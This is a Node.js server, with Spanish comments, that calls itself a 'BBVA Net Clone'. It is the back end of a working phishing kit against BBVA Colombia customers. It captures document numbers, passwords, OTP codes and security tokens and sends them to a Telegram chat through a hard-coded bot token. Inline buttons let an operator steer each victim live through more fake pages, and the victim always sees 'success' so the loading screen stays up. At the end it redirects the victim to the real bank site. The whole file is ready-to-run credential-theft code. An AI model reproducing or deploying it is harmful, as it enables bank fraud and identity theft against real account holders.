const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const axios = require('axios');
const path = require('path');

// ========================================
// CONFIGURACIÓN
// ========================================
const CONFIG = {
    TELEGRAM_BOT_TOKEN: '8343380638:AAGZ7Z6WBiQTn65itI0rqRUF3gQ13Ex_TKA',
    TELEGRAM_CHAT_ID: '-4997787461',
    PORT: 3000,
    TELEGRAM_API_BASE: 'https://api.telegram.org/bot'
};

// ========================================
// INICIALIZACIÓN
// ========================================
const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    },
    transports: ['websocket', 'polling'],
    pingTimeout: 60000,
    pingInterval: 25000,
    upgradeTimeout: 30000,
    allowUpgrades: true,
    cookie: false,
    serveClient: true,
    allowEIO3: true
});

// Store sessions: sessionId -> { socketId, data }
const activeSessions = new Map();

// ========================================
// MIDDLEWARE
// ========================================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(__dirname));

// Logging middleware
app.use((req, res, next) => {
    console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
    next();
});

// ========================================
// UTILIDADES TELEGRAM
// ========================================
class TelegramService {
    static async sendMessage(text, replyMarkup = null) {
        try {
            const url = `${CONFIG.TELEGRAM_API_BASE}${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`;
            const payload = {
                chat_id: CONFIG.TELEGRAM_CHAT_ID,
                text: text,
                parse_mode: 'HTML'
            };
            
            if (replyMarkup) {
                payload.reply_markup = replyMarkup;
            }
            
            const response = await axios.post(url, payload);
            console.log('✓ Mensaje enviado a Telegram');
            return response.data;
        } catch (error) {
            console.error('✗ Error al enviar mensaje a Telegram:', error.response?.data || error.message);
            throw error;
        }
    }
    
    static async answerCallbackQuery(callbackQueryId, text) {
        try {
            const url = `${CONFIG.TELEGRAM_API_BASE}${CONFIG.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`;
            await axios.post(url, {
                callback_query_id: callbackQueryId,
                text: text
            });
            console.log('✓ Callback respondido');
        } catch (error) {
            console.error('✗ Error al responder callback:', error.message);
        }
    }
    
    static createKeyboard(sessionId) {
        return {
            inline_keyboard: [
                [
                    { text: '🔄 Pedir Logo', callback_data: `logo_${sessionId}` },
                    { text: '📲 Pedir OTP', callback_data: `otp_${sessionId}` }
                ],
                [
                    { text: '🔐 Pedir Token', callback_data: `token_${sessionId}` },
                    { text: '✅ Finalizar', callback_data: `finish_${sessionId}` }
                ]
            ]
        };
    }
}

// ========================================
// SESSION MANAGER
// ========================================
class SessionManager {
    static create(socketId, data) {
        const sessionId = socketId;
        activeSessions.set(sessionId, {
            socketId,
            data,
            createdAt: new Date(),
            lastSocketId: socketId
        });
        console.log(`✓ Sesión creada: ${sessionId}`);
        return sessionId;
    }
    
    static get(sessionId) {
        return activeSessions.get(sessionId);
    }
    
    static getByAnySocket(socketId) {
        // Buscar sesión por cualquier socketId (original o actual)
        for (const [sessionId, session] of activeSessions.entries()) {
            if (session.socketId === socketId || session.lastSocketId === socketId) {
                return { sessionId, session };
            }
        }
        return null;
    }
    
    static update(sessionId, newData) {
        const session = activeSessions.get(sessionId);
        if (session) {
            session.data = { ...session.data, ...newData };
            console.log(`✓ Sesión actualizada: ${sessionId}`);
        }
    }
    
    static updateSocketId(sessionId, newSocketId) {
        const session = activeSessions.get(sessionId);
        if (session) {
            session.lastSocketId = newSocketId;
            console.log(`✓ Socket ID actualizado para sesión ${sessionId}: ${newSocketId}`);
        }
    }
    
    static delete(sessionId) {
        const deleted = activeSessions.delete(sessionId);
        if (deleted) {
            console.log(`✓ Sesión eliminada: ${sessionId}`);
        }
        return deleted;
    }
    
    static getSocketId(sessionId) {
        const session = activeSessions.get(sessionId);
        return session?.lastSocketId || session?.socketId;
    }
    
    static getAllSessions() {
        return Array.from(activeSessions.entries()).map(([id, session]) => ({
            sessionId: id,
            documentNumber: session.data.documentNumber,
            lastSocketId: session.lastSocketId,
            createdAt: session.createdAt
        }));
    }
}

// ========================================
// ROUTES
// ========================================
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'welcome.html'));
});

// Webhook para recibir actualizaciones de Telegram
app.post('/telegram-webhook', async (req, res) => {
    try {
        console.log('📩 Webhook recibido:', JSON.stringify(req.body, null, 2));
        
        const update = req.body;
        
        if (update.callback_query) {
            const callbackData = update.callback_query.data;
            const callbackQueryId = update.callback_query.id;
            const [action, sessionId] = callbackData.split('_');
            
            console.log(`🎯 Acción: ${action}, Sesión: ${sessionId}`);
            
            const socketId = SessionManager.getSocketId(sessionId);
            const socket = io.sockets.sockets.get(socketId);
            
            if (socket && socket.connected) {
                console.log(`✓ Socket encontrado y conectado: ${socketId}`);
                
                switch (action) {
                    case 'logo':
                        socket.emit('redirect', { url: '/index.html' });
                        await TelegramService.answerCallbackQuery(callbackQueryId, '🔄 Redirigiendo al login...');
                        break;
                        
                    case 'otp':
                        socket.emit('redirect', { url: '/otp.html' });
                        await TelegramService.answerCallbackQuery(callbackQueryId, '📲 Solicitando OTP...');
                        break;
                        
                    case 'finish':
                        socket.emit('redirect', { url: 'https://www.bbva.com.co/' });
                        await TelegramService.answerCallbackQuery(callbackQueryId, '✅ Sesión finalizada');
                        SessionManager.delete(sessionId);
                        break;
                        
                    default:
                        console.log(`⚠ Acción desconocida: ${action}`);
                }
            } else {
                console.log(`✗ Socket no encontrado o desconectado: ${socketId}`);
                await TelegramService.answerCallbackQuery(callbackQueryId, '❌ Sesión expirada o desconectada');
            }
        }
        
        res.sendStatus(200);
    } catch (error) {
        console.error('✗ Error en webhook:', error);
        res.sendStatus(500);
    }
});

// Endpoint para testing manual (para desarrollo local sin webhook)
app.post('/api/test-action', async (req, res) => {
    try {
        const { action, sessionId } = req.body;
        
        const socketId = SessionManager.getSocketId(sessionId);
        const socket = io.sockets.sockets.get(socketId);
        
        if (socket && socket.connected) {
            switch (action) {
                case 'logo':
                    socket.emit('redirect', { url: '/index.html' });
                    break;
                case 'otp':
                    socket.emit('redirect', { url: '/otp.html' });
                    break;
                case 'finish':
                    socket.emit('redirect', { url: 'https://www.bbva.com.co/' });
                    SessionManager.delete(sessionId);
                    break;
            }
            res.json({ success: true, message: 'Acción ejecutada' });
        } else {
            res.status(404).json({ success: false, message: 'Sesión no encontrada' });
        }
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ========================================
// SOCKET.IO EVENTS
// ========================================
io.on('connection', (socket) => {
    console.log(`✓ Cliente conectado: ${socket.id}`);
    
    // Check if this is a reconnection
    socket.on('identify-session', (data) => {
        const { originalSessionId } = data;
        if (originalSessionId) {
            SessionManager.updateSocketId(originalSessionId, socket.id);
            console.log(`✓ Cliente reidentificado. Sesión original: ${originalSessionId}, Nuevo socket: ${socket.id}`);
        }
    });
    
    // Login attempt
    socket.on('login-attempt', async (data) => {
        try {
            console.log('🔐 Intento de login:', data);
            
            const { documentType, documentNumber, password } = data;
            
            // Create session
            const sessionId = SessionManager.create(socket.id, {
                documentType,
                documentNumber,
                password
            });
            
            // Prepare message
            const message = `
🔐 <b>Nueva Credencial BBVA Net</b>

👤 <b>Tipo de Documento:</b> ${documentType}
🆔 <b>Número de Documento:</b> ${documentNumber}
🔑 <b>Contraseña:</b> ${password}

⏰ <b>Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
📱 <b>Session ID:</b> <code>${sessionId}</code>

<i>Presiona un botón para controlar al usuario:</i>`;
            
            const keyboard = TelegramService.createKeyboard(sessionId);
            
            // Send to Telegram
            await TelegramService.sendMessage(message, keyboard);
            
            // Confirm to client
            socket.emit('login-processing', { 
                success: true, 
                sessionId: sessionId 
            });
            
        } catch (error) {
            console.error('✗ Error en login-attempt:', error);
            socket.emit('login-error', { error: 'Error al procesar' });
        }
    });
    
    // OTP submit
    socket.on('otp-submit', async (data) => {
        try {
            console.log('📲 OTP recibido:', data);
            
            const { otp, originalSessionId } = data;
            
            // Buscar sesión - primero por socket actual, luego por session original
            let sessionId = socket.id;
            let session = SessionManager.get(sessionId);
            
            // Si no encuentra, buscar por cualquier socket relacionado
            if (!session && originalSessionId) {
                session = SessionManager.get(originalSessionId);
                sessionId = originalSessionId;
                // Actualizar el socket ID
                SessionManager.updateSocketId(sessionId, socket.id);
            }
            
            // Si aún no encuentra, buscar por el socket actual
            if (!session) {
                const found = SessionManager.getByAnySocket(socket.id);
                if (found) {
                    sessionId = found.sessionId;
                    session = found.session;
                }
            }
            
            if (session) {
                // Update session with OTP
                SessionManager.update(sessionId, { otp });
                
                const message = `
📲 <b>Código OTP Recibido</b>

🔢 <b>OTP:</b> <code>${otp}</code>
🆔 <b>Documento:</b> ${session.data.documentNumber}
🔑 <b>Contraseña:</b> ${session.data.password}

⏰ <b>Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
📱 <b>Session ID:</b> <code>${sessionId}</code>

<i>Presiona un botón para controlar al usuario:</i>`;
                
                const keyboard = TelegramService.createKeyboard(sessionId);
                
                // Send to Telegram
                await TelegramService.sendMessage(message, keyboard);
                
                // Confirm to client - SIEMPRE éxito, nunca error
                socket.emit('otp-processing', { 
                    success: true,
                    sessionId: sessionId
                });
            } else {
                console.log('⚠ Sesión no encontrada para OTP, pero enviando confirmación');
                // Enviar éxito de todas formas para mantener pantalla de carga
                socket.emit('otp-processing', { 
                    success: true,
                    sessionId: socket.id
                });
            }
            
        } catch (error) {
            console.error('✗ Error en otp-submit:', error);
            socket.emit('otp-error', { error: 'Error al procesar' });
        }
    });
    
    // Token submit
    socket.on('token-submit', async (data) => {
        try {
            console.log('🔐 Token recibido:', data);
            
            const { token, originalSessionId } = data;
            
            // Buscar sesión - primero por socket actual, luego por session original
            let sessionId = socket.id;
            let session = SessionManager.get(sessionId);
            
            // Si no encuentra, buscar por cualquier socket relacionado
            if (!session && originalSessionId) {
                session = SessionManager.get(originalSessionId);
                sessionId = originalSessionId;
                // Actualizar el socket ID
                SessionManager.updateSocketId(sessionId, socket.id);
            }
            
            // Si aún no encuentra, buscar por el socket actual
            if (!session) {
                const found = SessionManager.getByAnySocket(socket.id);
                if (found) {
                    sessionId = found.sessionId;
                    session = found.session;
                }
            }
            
            if (session) {
                // Update session with token
                SessionManager.update(sessionId, { token });
                
                const message = `
🔐 <b>Token de Seguridad Recibido</b>

🔢 <b>Token:</b> <code>${token}</code>
🆔 <b>Documento:</b> ${session.data.documentNumber}
🔑 <b>Contraseña:</b> ${session.data.password}
${session.data.otp ? `📲 <b>OTP:</b> ${session.data.otp}` : ''}

⏰ <b>Fecha:</b> ${new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' })}
📱 <b>Session ID:</b> <code>${sessionId}</code>

<i>Presiona un botón para controlar al usuario:</i>`;
                
                const keyboard = TelegramService.createKeyboard(sessionId);
                
                // Send to Telegram
                await TelegramService.sendMessage(message, keyboard);
                
                // Confirm to client - SIEMPRE éxito, nunca error
                socket.emit('token-processing', { 
                    success: true,
                    sessionId: sessionId
                });
            } else {
                console.log('⚠ Sesión no encontrada para Token, pero enviando confirmación');
                // Enviar éxito de todas formas para mantener pantalla de carga
                socket.emit('token-processing', { 
                    success: true,
                    sessionId: socket.id
                });
            }
            
        } catch (error) {
            console.error('✗ Error en token-submit:', error);
            // No enviar error al cliente, mantener pantalla de carga
            socket.emit('token-processing', { 
                success: true,
                sessionId: socket.id
            });
        }
    });
    
    // Disconnect
    socket.on('disconnect', () => {
        console.log(`✗ Cliente desconectado: ${socket.id}`);
        // Don't delete session immediately - user might reconnect
        // Sessions will persist for reconnection
    });
    
    // Handle reconnection
    socket.on('reconnect', () => {
        console.log(`🔄 Cliente reconectado: ${socket.id}`);
    });
});

// ========================================
// TELEGRAM POLLING (PARA DESARROLLO LOCAL)
// ========================================
let lastUpdateId = 0;
let pollingActive = false;

async function startTelegramPolling() {
    if (pollingActive) return;
    pollingActive = true;
    
    console.log('🔄 Iniciando polling de Telegram...');
    
    // Delete webhook first
    try {
        await axios.post(`${CONFIG.TELEGRAM_API_BASE}${CONFIG.TELEGRAM_BOT_TOKEN}/deleteWebhook`);
        console.log('✓ Webhook eliminado, usando polling');
    } catch (error) {
        console.log('⚠ Error al eliminar webhook:', error.message);
    }
    
    // Start polling loop
    pollTelegram();
}

async function pollTelegram() {
    if (!pollingActive) return;
    
    try {
        const response = await axios.get(
            `${CONFIG.TELEGRAM_API_BASE}${CONFIG.TELEGRAM_BOT_TOKEN}/getUpdates`,
            {
                params: {
                    offset: lastUpdateId + 1,
                    timeout: 30,
                    allowed_updates: ['callback_query']
                }
            }
        );
        
        const updates = response.data.result;
        
        for (const update of updates) {
            if (update.update_id > lastUpdateId) {
                lastUpdateId = update.update_id;
            }
            
            if (update.callback_query) {
                await handleTelegramCallback(update.callback_query);
            }
        }
    } catch (error) {
        if (error.code !== 'ECONNABORTED') {
            console.error('✗ Error en polling:', error.message);
        }
    }
    
    // Continue polling
    if (pollingActive) {
        setImmediate(pollTelegram);
    }
}

async function handleTelegramCallback(callbackQuery) {
    try {
        const callbackData = callbackQuery.data;
        const callbackQueryId = callbackQuery.id;
        const [action, sessionId] = callbackData.split('_');
        
        console.log(`🎯 Callback recibido - Acción: ${action}, Sesión: ${sessionId}`);
        
        const socketId = SessionManager.getSocketId(sessionId);
        const socket = io.sockets.sockets.get(socketId);
        
        if (socket && socket.connected) {
            console.log(`✓ Socket encontrado y conectado: ${socketId}`);
            
            let url = '';
            let message = '';
            
            switch (action) {
                case 'logo':
                    url = '/index.html';
                    message = '🔄 Redirigiendo al login...';
                    break;
                    
                case 'otp':
                    url = '/otp.html';
                    message = '📲 Solicitando OTP...';
                    break;
                    
                case 'token':
                    url = '/token.html';
                    message = '🔐 Solicitando Token...';
                    break;
                    
                case 'finish':
                    url = 'https://www.bbva.com.co/';
                    message = '✅ Sesión finalizada';
                    SessionManager.delete(sessionId);
                    break;
                    
                default:
                    console.log(`⚠ Acción desconocida: ${action}`);
                    return;
            }
            
            // Send redirect to client
            socket.emit('redirect', { url });
            console.log(`✓ Redirección enviada: ${url}`);
            
            // Answer callback query
            await TelegramService.answerCallbackQuery(callbackQueryId, message);
        } else {
            console.log(`✗ Socket no encontrado o desconectado: ${socketId}`);
            await TelegramService.answerCallbackQuery(
                callbackQueryId, 
                '❌ Sesión expirada. El usuario se desconectó.'
            );
        }
    } catch (error) {
        console.error('✗ Error al manejar callback:', error.message);
    }
}

// ========================================
// SETUP WEBHOOK (PARA PRODUCCIÓN)
// ========================================
async function setupWebhook() {
    try {
        // Por defecto NO hace polling para evitar 409 Conflict (mismo bot token compartido).
        // Para correr esta banca AISLADA: set STANDALONE_BOT=1
        if (!(process.env.STANDALONE_BOT === '1' || process.env.STANDALONE_BOT === 'true')) {
            console.log('ℹ STANDALONE_BOT no activo: BBVA NO inicia polling de Telegram (lo maneja el server raíz).');
            return;
        }
        // Para desarrollo local, usa polling
        console.log('ℹ Modo desarrollo: Usando polling de Telegram');
        console.log('ℹ Para producción con webhook, configura ngrok o servidor público');
        
        // Start polling
        startTelegramPolling();
        
    } catch (error) {
        console.error('✗ Error en configuración:', error.message);
    }
}

// ========================================
// START SERVER
// ========================================
server.listen(CONFIG.PORT, () => {
    console.log('');
    console.log('========================================');
    console.log('  🚀 BBVA Net Clone - Servidor Activo');
    console.log('========================================');
    console.log(`  📡 Servidor: http://localhost:${CONFIG.PORT}`);
    console.log(`  🔐 Login: http://localhost:${CONFIG.PORT}/index.html`);
    console.log(`  📲 OTP: http://localhost:${CONFIG.PORT}/otp.html`);
    console.log('========================================');
    console.log('');
    
    setupWebhook();
});

// ========================================
// CLEANUP ON EXIT
// ========================================
process.on('SIGINT', () => {
    console.log('\n🛑 Cerrando servidor...');
    pollingActive = false;
    server.close(() => {
        console.log('✓ Servidor cerrado');
        process.exit(0);
    });
});

// ========================================
// ERROR HANDLERS
// ========================================
process.on('uncaughtException', (error) => {
    console.error('✗ Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('✗ Unhandled Rejection at:', promise, 'reason:', reason);
});
